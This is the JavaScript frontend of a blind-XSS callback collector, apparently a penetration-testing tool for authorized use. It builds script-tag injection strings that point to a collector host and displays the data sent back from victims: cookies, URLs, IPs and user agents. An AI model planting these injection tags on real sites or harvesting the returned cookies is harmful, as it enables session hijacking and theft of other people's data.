// XSS callback dashboard for explicitly authorized security testing.
// This frontend intentionally mirrors the current Go /api/xss contract.
(function () {
    'use strict';

    const XSS = {
        payloads: [],
        captures: [],
        config: null,
        initialized: false
    };

    const API_BASE = '/api/xss';

    function apiRequest(method, url, data) {
        const options = {
            method: method,
            headers: { 'Content-Type': 'application/json' }
        };
        if (data !== undefined) options.body = JSON.stringify(data);

        const request = (typeof apiFetch === 'function')
            ? apiFetch(url, options)
            : fetch(url, options);

        return request.then(function (res) {
            return res.text().then(function (raw) {
                let body = {};
                if (raw) {
                    try { body = JSON.parse(raw); }
                    catch (e) { body = { error: 'Invalid JSON response' }; }
                }
                if (!res.ok) {
                    throw new Error(body.error || ('HTTP ' + res.status));
                }
                return body;
            });
        });
    }

    function sel(id) {
        return document.getElementById(id);
    }

    function escapeHtml(value) {
        if (value === null || value === undefined) return '';
        const div = document.createElement('div');
        div.textContent = String(value);
        return div.innerHTML;
    }

    function escapeAttr(value) {
        return escapeHtml(value).replace(/"/g, '&quot;').replace(/'/g, '&#39;');
    }

    function showToast(message, type) {
        if (window.showToast) {
            window.showToast(message, type || 'info');
            return;
        }
        const box = document.createElement('div');
        box.textContent = message;
        box.style.cssText = 'position:fixed;top:20px;right:20px;z-index:12000;padding:10px 16px;border-radius:6px;color:#fff;background:#3182ce;box-shadow:0 4px 12px rgba(0,0,0,.2)';
        if (type === 'error') box.style.background = '#dc2626';
        if (type === 'success') box.style.background = '#16a34a';
        if (type === 'warn') box.style.background = '#d97706';
        document.body.appendChild(box);
        setTimeout(function () { box.remove(); }, 3500);
    }

    function formatTime(value) {
        if (!value) return '-';
        const d = new Date(value);
        return Number.isNaN(d.getTime()) ? escapeHtml(value) : escapeHtml(d.toLocaleString());
    }

    function closeModal(elm) {
        const overlay = elm && elm.classList && elm.classList.contains('xss-modal-overlay')
            ? elm
            : (elm && elm.closest ? elm.closest('.xss-modal-overlay') : null);
        if (overlay) overlay.style.display = 'none';
    }

    function collectorBaseURL() {
        if (!XSS.config) return '';
        let base = String(XSS.config.public_url || '').trim();
        if (!base && XSS.config.bind_host && XSS.config.bind_port) {
            base = 'http://' + XSS.config.bind_host + ':' + XSS.config.bind_port;
        }
        return base.replace(/\/$/, '');
    }

    function scriptForToken(token) {
        const base = collectorBaseURL();
        if (!base || !token) return '';
        return '<script src="' + base + '/xss/' + token + '.js"><\/script>';
    }

    function domainFromSource(source) {
        source = String(source || '').trim();
        if (!source) return '';
        try {
            return new URL(source).hostname || '';
        } catch (e) {
            return source.replace(/^https?:\/\//i, '').split('/')[0].split(':')[0];
        }
    }

    XSS.loadConfig = function () {
        return apiRequest('GET', API_BASE + '/config').then(function (data) {
            XSS.config = data || {};
            XSS.renderStatusBar();
            return XSS.config;
        }).catch(function (err) {
            XSS.config = null;
            XSS.renderStatusBar();
            showToast('載入 XSS 收集器設定失敗：' + err.message, 'error');
            throw err;
        });
    };

    XSS.renderStatusBar = function () {
        const bar = sel('xss-status-bar');
        const text = sel('xss-status-text');
        if (!bar || !text) return;

        if (!XSS.config) {
            text.textContent = '無法取得收集器狀態';
            return;
        }

        const enabled = !!XSS.config.enabled;
        const base = collectorBaseURL() || '(未設定)';
        text.textContent = enabled
            ? '收集服務已啟用｜' + base + '｜冷卻 ' + (XSS.config.cooldown_seconds || 0) + ' 秒'
            : '收集服務未啟用｜目前設定：' + base;
    };

    XSS.loadPayloads = function () {
        return apiRequest('GET', API_BASE + '/payloads').then(function (data) {
            XSS.payloads = Array.isArray(data.payloads) ? data.payloads : [];
            XSS.renderPayloads();
        }).catch(function (err) {
            showToast('載入 XSS 載荷失敗：' + err.message, 'error');
        });
    };

    XSS.renderPayloads = function () {
        const tbody = sel('xss-payload-list');
        const empty = sel('xss-payload-empty');
        const count = sel('xss-payload-count');
        if (!tbody) return;

        if (count) count.textContent = String(XSS.payloads.length);
        if (!XSS.payloads.length) {
            tbody.innerHTML = '';
            if (empty) empty.hidden = false;
            return;
        }
        if (empty) empty.hidden = true;

        let html = '';
        XSS.payloads.forEach(function (p) {
            const source = p.domain || p.description || '-';
            html += '<tr>' +
                '<td>' + escapeHtml(p.name || '(未命名)') + '</td>' +
                '<td>' + escapeHtml(source) + '</td>' +
                '<td>' + (p.enabled ? '啟用' : '停用') + '</td>' +
                '<td>' + formatTime(p.created_at) + '</td>' +
                '<td class="xss-cell-actions">' +
                    '<button type="button" class="btn-secondary btn-sm" data-xss-action="show-script" data-xss-id="' + escapeAttr(p.id) + '">查看腳本</button> ' +
                    '<button type="button" class="btn-secondary btn-sm" data-xss-action="copy-script" data-xss-id="' + escapeAttr(p.id) + '">複製</button> ' +
                    '<button type="button" class="btn-danger-outline btn-sm" data-xss-action="delete-payload" data-xss-id="' + escapeAttr(p.id) + '">刪除</button>' +
                '</td>' +
            '</tr>';
        });
        tbody.innerHTML = html;
    };

    XSS.openGenerateModal = function () {
        const modal = sel('xss-generate-modal');
        if (!modal) return;
        if (sel('xss-generate-name')) sel('xss-generate-name').value = '';
        if (sel('xss-generate-source')) sel('xss-generate-source').value = '';
        modal.style.display = 'flex';
    };

    XSS.generatePayload = function () {
        const name = (sel('xss-generate-name') ? sel('xss-generate-name').value : '').trim();
        const source = (sel('xss-generate-source') ? sel('xss-generate-source').value : '').trim();
        if (!name) {
            showToast('請輸入載荷名稱', 'warn');
            return;
        }

        const body = {
            name: name,
            type: 'image',
            payload: '',
            description: source,
            domain: domainFromSource(source),
            domain_only: source ? 1 : 0,
            enabled: true
        };
        if (typeof getActiveProjectId === 'function') {
            const projectId = getActiveProjectId();
            if (projectId) body.project_id = projectId;
        }

        apiRequest('POST', API_BASE + '/payloads', body).then(function (data) {
            closeModal(sel('xss-generate-modal'));
            XSS.loadPayloads();
            const script = data.public_url ? '<script src="' + data.public_url + '"><\/script>' : scriptForToken(data.token);
            XSS.openScriptModal({ id: data.id, script: script });
        }).catch(function (err) {
            showToast('生成載荷失敗：' + err.message, 'error');
        });
    };

    XSS.openScriptModal = function (payload) {
        const modal = sel('xss-script-modal');
        const ta = sel('xss-script-text');
        if (!modal || !ta) return;
        ta.value = payload && payload.script ? payload.script : '';
        modal.style.display = 'flex';
    };

    XSS.loadPayloadScript = function (id, openModal) {
        apiRequest('GET', API_BASE + '/payloads/' + encodeURIComponent(id)).then(function (p) {
            const script = scriptForToken(p.token);
            if (openModal) {
                XSS.openScriptModal({ id: p.id, script: script });
                return;
            }
            XSS.copyText(script);
        }).catch(function (err) {
            showToast('取得載荷失敗：' + err.message, 'error');
        });
    };

    XSS.copyText = function (text) {
        if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(text).then(function () {
                showToast('已複製', 'success');
            }).catch(function () {
                fallbackCopy(text);
            });
            return;
        }
        fallbackCopy(text);
    };

    function fallbackCopy(text) {
        const ta = document.createElement('textarea');
        ta.value = text;
        ta.style.position = 'fixed';
        ta.style.left = '-9999px';
        document.body.appendChild(ta);
        ta.select();
        try { document.execCommand('copy'); } catch (e) { /* no-op */ }
        ta.remove();
        showToast('已複製', 'success');
    }

    XSS.copyScript = function () {
        const ta = sel('xss-script-text');
        if (ta) XSS.copyText(ta.value);
    };

    XSS.deletePayload = function (id) {
        if (!window.confirm('確定刪除此載荷及其關聯 capture 嗎？')) return;
        apiRequest('DELETE', API_BASE + '/payloads/' + encodeURIComponent(id)).then(function () {
            showToast('載荷已刪除', 'success');
            XSS.loadPayloads();
            XSS.loadCaptures();
        }).catch(function (err) {
            showToast('刪除載荷失敗：' + err.message, 'error');
        });
    };

    XSS.loadCaptures = function () {
        return apiRequest('GET', API_BASE + '/captures').then(function (data) {
            XSS.captures = Array.isArray(data.captures) ? data.captures : [];
            XSS.renderCaptures();
        }).catch(function (err) {
            showToast('載入回連紀錄失敗：' + err.message, 'error');
        });
    };

    XSS.renderCaptures = function () {
        const tbody = sel('xss-capture-list');
        const empty = sel('xss-capture-empty');
        const count = sel('xss-capture-count');
        if (!tbody) return;

        if (count) count.textContent = String(XSS.captures.length);
        if (!XSS.captures.length) {
            tbody.innerHTML = '';
            if (empty) empty.hidden = false;
            return;
        }
        if (empty) empty.hidden = true;

        let html = '';
        XSS.captures.forEach(function (c) {
            const cookieSummary = c.cookie
                ? '<code class="xss-cookie-value">' + escapeHtml(c.cookie) + '</code>'
                : '<span class="xss-muted">回連成功；無可讀 Cookie（可能為 HttpOnly）</span>';

            html += '<tr>' +
                '<td>' + formatTime(c.created_at) + '</td>' +
                '<td>' + escapeHtml(c.url || c.domain || '-') + '</td>' +
                '<td>' + escapeHtml(c.domain || '-') + '</td>' +
                '<td>' + cookieSummary + '</td>' +
                '<td>received</td>' +
                '<td><button type="button" class="btn-secondary btn-sm" data-xss-action="show-capture" data-xss-id="' + escapeAttr(c.id) + '">詳細</button></td>' +
            '</tr>';
        });
        tbody.innerHTML = html;
    };

    XSS.openCaptureDetail = function (id) {
        const cap = XSS.captures.find(function (item) { return String(item.id) === String(id); });
        if (!cap) {
            showToast('找不到 capture', 'error');
            return;
        }
        const modal = sel('xss-detail-modal');
        const body = sel('xss-detail-body');
        if (!modal || !body) return;

        const rows = [
            ['時間', formatTime(cap.created_at)],
            ['URL', escapeHtml(cap.url || '-')],
            ['Domain', escapeHtml(cap.domain || '-')],
            ['User-Agent', escapeHtml(cap.user_agent || '-')],
            ['IP', escapeHtml(cap.ip || '-')],
            ['Cookie', escapeHtml(cap.cookie || '(無可讀 Cookie)')],
            ['Extra', escapeHtml(cap.extra || '-')]
        ].map(function (row) {
            return '<tr><th>' + row[0] + '</th><td><code>' + row[1] + '</code></td></tr>';
        }).join('');

        body.innerHTML = '<table class="xss-kv-table"><tbody>' + rows + '</tbody></table>';
        modal.style.display = 'flex';
    };

    XSS.showConfig = function () {
        const modal = sel('xss-config-modal');
        if (!modal) return;
        XSS.loadConfig().then(function (cfg) {
            if (sel('xss-config-enabled')) {
                sel('xss-config-enabled').checked = !!cfg.enabled;
                sel('xss-config-enabled').disabled = true;
            }
            if (sel('xss-config-bind')) {
                sel('xss-config-bind').value = (cfg.bind_host || '-') + ':' + (cfg.bind_port || '-');
            }
            if (sel('xss-config-url')) sel('xss-config-url').value = collectorBaseURL() || '-';
            if (sel('xss-config-cooldown')) sel('xss-config-cooldown').value = String(cfg.cooldown_seconds || 0);
        });
        modal.style.display = 'flex';
    };

    // Current backend exposes configuration read-only. Keep the function so old
    // HTML does not throw if a stale cached template still calls it.
    XSS.saveConfig = function () {
        showToast('目前 XSS 收集器設定為唯讀；請修改伺服器設定後重啟服務。', 'warn');
    };

    XSS.closeModal = closeModal;

    function bindActions() {
        if (document.documentElement.dataset.xssActionsBound === '1') return;
        document.documentElement.dataset.xssActionsBound = '1';
        document.addEventListener('click', function (e) {
            const btn = e.target.closest('[data-xss-action]');
            if (!btn) return;
            const action = btn.getAttribute('data-xss-action');
            const id = btn.getAttribute('data-xss-id');
            if (action === 'show-script') XSS.loadPayloadScript(id, true);
            else if (action === 'copy-script') XSS.loadPayloadScript(id, false);
            else if (action === 'delete-payload') XSS.deletePayload(id);
            else if (action === 'show-capture') XSS.openCaptureDetail(id);
        });
    }

    XSS.init = function () {
        if (!XSS.initialized) {
            XSS.initialized = true;
            bindActions();
        }
        Promise.allSettled([
            XSS.loadConfig(),
            XSS.loadPayloads(),
            XSS.loadCaptures()
        ]);
    };

    window.XSS = XSS;
})();